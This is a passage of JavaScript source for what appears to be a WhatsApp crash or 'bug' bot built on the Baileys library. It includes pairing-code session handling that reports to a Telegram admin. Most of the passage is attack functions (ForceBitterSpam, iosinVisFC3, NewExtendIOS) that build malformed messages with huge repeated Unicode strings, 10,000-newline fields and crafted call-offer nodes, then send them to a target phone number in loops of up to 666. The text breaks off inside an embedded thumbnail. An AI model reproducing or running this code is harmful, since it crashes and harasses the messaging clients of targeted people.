                        `✅ <b>BERHASIL TERHUBUNG!</b>\n\nNomor: <code>${cleanNumber}</code>\nFolder: <code>device${cleanNumber}</code>\nStatus: Connected`, 
                        { parse_mode: 'HTML' }
                    );
                }
            } 
            
            else if (connection === 'close') {
                const reason = lastDisconnect?.error?.output?.statusCode;
                console.log(`Connection closed: ${reason}`);
                if (reason !== DisconnectReason.loggedOut) {
                    // Opsional: Reconnect logic
                }
            }
        });

        // REQUEST KODE
        if (!sock.authState.creds.registered) {
            
            // Delay biar socket siap
            await new Promise(r => setTimeout(r, 2000));

            const code = await sock.requestPairingCode(cleanNumber);
            const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

            // 🔔 NOTIF 2: KODE DITERIMA
            if (global.bot && global.adminChatId) {
                global.bot.telegram.sendMessage(global.adminChatId, 
                    `🔑 <b>KODE PAIRING DITERIMA</b>\n\nNomor: <code>${cleanNumber}</code>\nKode: <code>${formattedCode}</code>\n\n<i>Silakan masukkan kode ini di perangkat target.</i>`, 
                    { parse_mode: 'HTML' }
                );
            }

            res.json({
                status: 'success',
                message: 'Code Generated',
                code: formattedCode
            });
        } else {
            if (global.bot && global.adminChatId) {
                global.bot.telegram.sendMessage(global.adminChatId, `⚠️ Nomor ${cleanNumber} sudah terdaftar/login.`);
            }
            res.json({ status: 'false', message: 'Nomor sudah terdaftar/Login.' });
        }

    } catch (error) {
        console.error("[PAIRING ERROR]:", error);
        if (global.bot && global.adminChatId) {
            global.bot.telegram.sendMessage(global.adminChatId, `❌ Error Pairing: ${error.message}`);
        }
        res.json({ status: 'error', message: 'Gagal: ' + error.message });
    }
});

// FUNGSI UPDATE JSON
function updateSessionsFile(number) {
    let currentSessions = [];
    if (fs.existsSync(file_session)) {
        try {
            currentSessions = JSON.parse(fs.readFileSync(file_session, 'utf-8'));
            if (!Array.isArray(currentSessions)) currentSessions = [];
        } catch { currentSessions = []; }
    }

    if (!currentSessions.includes(number)) {
        currentSessions.push(number);
        fs.writeFileSync(file_session, JSON.stringify(currentSessions, null, 2));
    }
}

// --- API: LOGOUT (Ganti yang lama dengan ini) ---
app.post('/api/logout', (req, res) => {
    const { reason } = req.body;
    const username = req.cookies.sessionUser || "Unknown";
    
    console.log(`[LOGOUT] User: ${username} | Alasan: ${reason}`);

    // Hapus Cookie
    res.clearCookie('sessionUser');
    res.clearCookie('sessionKey');
    
    return res.json({ success: true });
});

app.listen(PORT, () => {
  console.log(chalk.red(`Server Online Enjoy Freind`));
});

module.exports = { 
  loadAkses, 
  saveAkses, 
  isOwner, 
  isAuthorized,
  saveUsers,
  getUsers
};

// Function Apps Hytam//
async function ForceBitterSpam(target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let expensionNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let ZayCoreX = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                intwractiveMessage: {
                    body: {
                        text: 'ðŸ©¸YT ZayyOfficial'
                    },
                    footer: {
                        text: 'ðŸ©¸YT ZayyOfficial'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: 'ðŸ©¸YT ZayyOfficial'
                            },
                            footer: {
                                text: 'ðŸ©¸YT ZayyOfficial'
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, ZayCoreX, {
        messageId: null,
        participant: { jid: target },
        userJid: target
    });

    await sock.sendNode(expensionNode);
}


// Func Force IOS
async function iosinVisFC3(sock, target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/Kepoo",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "FyzzCrasher",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, 
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 100; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function NewExtendIOS(sock, target) {
    for (let i = 0; i < 666; i++) {
        const extendedTextMessage = {
            text: `# ! Fyzz - Ex4s !  🐉 \n\n 🫀 creditos : t.me/rizxvelzinfinity ` + "𑇂𑆵𑆴𑆿".repeat(25000),
            matchedText: "https://t.me/Kepooo",
            description: "# ! Fyzz - Ex4s ! 🐉" + "𑇂𑆵𑆴𑆿".repeat(150),
            title: "# ! Fyzz - Ex4s !〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
